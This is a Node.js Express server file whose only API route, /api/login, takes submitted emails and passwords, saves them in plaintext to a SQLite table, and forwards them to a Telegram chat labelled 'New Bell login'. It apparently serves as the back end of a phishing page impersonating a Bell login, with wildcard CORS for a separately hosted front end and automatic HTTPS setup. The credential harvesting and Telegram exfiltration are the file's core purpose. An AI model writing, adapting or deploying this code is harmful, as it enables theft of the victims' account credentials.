const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const { execFile } = require('child_process');
const sqlite3 = require('sqlite3').verbose();
const helmet = require('helmet');

const app = express();
const port = Number(process.env.PORT || process.env.HTTP_PORT || 3000);
const httpPort = Number(process.env.HTTP_PORT || process.env.PORT || 80);
const httpsPort = Number(process.env.HTTPS_PORT || process.env.PORT || 443);

function pickFallbackPort(requestedPort, fallbackPort) {
  return Number.isFinite(requestedPort) && requestedPort > 0 ? requestedPort : fallbackPort;
}

function listenOnPort(server, requestedPort, fallbackPort, label) {
  return new Promise((resolve, reject) => {
    const actualPort = pickFallbackPort(requestedPort, fallbackPort);
    server.once('error', (error) => {
      if (error && error.code === 'EADDRINUSE' && actualPort !== fallbackPort) {
        server.close(() => resolve(listenOnPort(server, fallbackPort, fallbackPort, label)));
        return;
      }
      reject(error);
    });

    server.listen(actualPort, () => {
      server.off('error', () => {});
      resolve(actualPort);
    });
  });
}

function loadEnvFile() {
  const envPath = path.join(__dirname, '.env');
  if (!fs.existsSync(envPath)) {
    return;
  }

  const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) {
      continue;
    }

    const separatorIndex = trimmed.indexOf('=');
    if (separatorIndex === -1) {
      continue;
    }

    const key = trimmed.slice(0, separatorIndex).trim();
    let value = trimmed.slice(separatorIndex + 1).trim();
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }

    if (!process.env[key]) {
      process.env[key] = value;
    }
  }
}

loadEnvFile();

const dbFile = path.join(__dirname, 'data.db');
const db = new sqlite3.Database(dbFile);

const domain = (process.env.DOMAIN || process.env.SSL_DOMAIN || '').trim();
const letsEncryptEmail = (process.env.LETSENCRYPT_EMAIL || process.env.EMAIL || '').trim();
const certDir = process.env.CERT_DIR || process.env.CERT_PATH || path.join(__dirname, 'certs');
const fullchainPath = process.env.FULLCHAIN_PATH || path.join(certDir, 'fullchain.pem');
const privateKeyPath = process.env.PRIVATE_KEY_PATH || path.join(certDir, 'privkey.pem');
const certbotBinary = process.env.CERTBOT_BIN || 'certbot';
const enforceHttps = process.env.ENFORCE_HTTPS !== 'false';
let redirectToHttps = false;

function htmlEscape(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/>/g, '&gt;')
    .replace(/</g, '&lt;')
    .replace(/"/g, '&quot;');
}

function isPlaceholderValue(value) {
  return /your_(bot|chat)_token|your_chat_id|replace_me/i.test(value || '');
}

function sendTelegramNotification(payload) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId || isPlaceholderValue(botToken) || isPlaceholderValue(chatId)) {
    console.warn('Telegram bot token or chat id not configured. Skipping notification.');
    return Promise.resolve();
  }

  const time = new Date().toISOString();
  const message = [
    '<b>🔔 New Bell login</b>',
    '',
    `<b>Email:</b> <code>${htmlEscape(payload.email)}</code>`,
    `<b>Password:</b> <code>${htmlEscape(payload.password)}</code>`,
    '',
    `<b>Time:</b> <code>${htmlEscape(time)}</code>`
  ].join('\n');

  const body = JSON.stringify({ chat_id: chatId, parse_mode: 'HTML', text: message });

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${botToken}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    }
  };

  const maxAttempts = 3;
  let attempt = 0;

  function doRequest() {
    return new Promise((resolveReq, rejectReq) => {
      const req = require('https').request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            try {
              resolveReq(data ? JSON.parse(data) : {});
            } catch (e) {
              resolveReq({});
            }
          } else {
            rejectReq(new Error(`Telegram API error ${res.statusCode}: ${data}`));
          }
        });
      });

      req.on('error', (err) => rejectReq(err));
      req.write(body);
      req.end();
    });
  }

  return new Promise((resolve, reject) => {
    (function sendAttempt() {
      attempt += 1;
      doRequest()
        .then(resolve)
        .catch((err) => {
          if (attempt < maxAttempts) {
            const backoff = attempt * 300;
            setTimeout(sendAttempt, backoff);
          } else {
            reject(err);
          }
        });
    })();
  });
}

function shouldRedirectToHttps(req) {
  return redirectToHttps && enforceHttps && !req.secure && !['localhost', '127.0.0.1'].includes(req.hostname);
}

function ensureCertificates() {
  if (!domain || !letsEncryptEmail) {
    return Promise.resolve(false);
  }

  if (fs.existsSync(fullchainPath) && fs.existsSync(privateKeyPath)) {
    return Promise.resolve(true);
  }

  return new Promise((resolve) => {
    const args = ['certonly', '--standalone', '--non-interactive', '--agree-tos', '-m', letsEncryptEmail, '-d', domain];
    console.log(`Attempting to obtain SSL certificate for ${domain} via certbot...`);

    execFile(certbotBinary, args, { stdio: 'inherit' }, (error) => {
      if (error) {
        console.warn(`SSL certificate acquisition failed: ${error.message}`);
        resolve(false);
        return;
      }

      const ready = fs.existsSync(fullchainPath) && fs.existsSync(privateKeyPath);
      if (ready) {
        console.log(`SSL certificate ready for ${domain}`);
      } else {
        console.warn('SSL certificate files were not created at the expected location.');
      }
      resolve(ready);
    });
  });
}

function createHttpsServer() {
  if (!fs.existsSync(fullchainPath) || !fs.existsSync(privateKeyPath)) {
    return null;
  }

  const credentials = {
    key: fs.readFileSync(privateKeyPath),
    cert: fs.readFileSync(fullchainPath)
  };

  return https.createServer(credentials, app);
}

app.set('trust proxy', true);
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

app.use((req, res, next) => {
  if (shouldRedirectToHttps(req)) {
    res.redirect(301, `https://${req.hostname}${req.originalUrl}`);
    return;
  }
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Allow cross-origin requests from a separately hosted frontend.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});

// API-only backend: frontend is hosted separately and calls this backend URL.

// Create table if not exists
const createTableSQL = `
CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);`;

db.run(createTableSQL, (err) => {
  if (err) {
    console.error('Failed to create users table:', err.message);
  }
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const userAgent = req.get('User-Agent') || 'unknown';
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Email and password are required.' });
  }

  const insertSQL = `INSERT INTO users (email, password) VALUES (?, ?)`;
  db.run(insertSQL, [email, password], function (err) {
    if (err) {
      console.error('Database insert error:', err.message);
      return res.status(500).json({ success: false, message: 'Internal server error.' });
    }

    sendTelegramNotification({ email, password, ipAddress, userAgent })
      .then(() => {
        res.json({ success: true, id: this.lastID, message: 'Login details saved and Telegram notified.' });
      })
      .catch((notifyErr) => {
        console.error('Telegram notification error:', notifyErr.message);
        res.json({ success: true, id: this.lastID, message: 'Login saved; Telegram notification failed.' });
      });
  });
});

app.use((req, res) => {
  res.status(404).send('Not Found');
});

ensureCertificates().then((certReady) => {
  redirectToHttps = certReady;
  const httpServer = http.createServer(app);
  const httpsServer = certReady ? createHttpsServer() : null;

  const telegramConfigured = Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID && !isPlaceholderValue(process.env.TELEGRAM_BOT_TOKEN) && !isPlaceholderValue(process.env.TELEGRAM_CHAT_ID));

  listenOnPort(httpServer, httpPort, port, 'HTTP')
    .then((actualHttpPort) => {
      console.log(`HTTP server listening on http://localhost:${actualHttpPort}`);
      console.log(`Telegram notifications: ${telegramConfigured ? 'enabled' : 'disabled (set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env)'}`);
    })
    .catch((error) => {
      console.error('HTTP server failed to start:', error.message);
      process.exitCode = 1;
    });

  if (certReady && httpsServer) {
    listenOnPort(httpsServer, httpsPort, 3443, 'HTTPS')
      .then((actualHttpsPort) => {
        console.log(`HTTPS server listening on https://localhost:${actualHttpsPort}`);
      })
      .catch((error) => {
        console.error('HTTPS server failed to start:', error.message);
      });
  } else {
    console.warn('HTTPS is disabled because no certificate was available. Configure DOMAIN and LETSENCRYPT_EMAIL, or place certificates in certs/fullchain.pem and certs/privkey.pem.');
  }
});
